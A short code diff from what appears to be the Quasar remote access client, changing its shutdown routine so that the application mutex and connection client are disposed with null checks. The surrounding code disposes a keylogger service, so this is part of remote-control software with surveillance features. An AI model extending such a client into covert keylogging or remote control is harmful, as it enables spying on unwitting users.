@@ -212,8 +212,8 @@ namespace Quasar.Client
                 CleanupMessageProcessors();
                 _keyloggerService?.Dispose();
                 _userActivityDetection?.Dispose();
-                ApplicationMutex.Dispose();
-                _connectClient.Dispose();
+                ApplicationMutex?.Dispose();
+                _connectClient?.Dispose();
             }
         }
     }
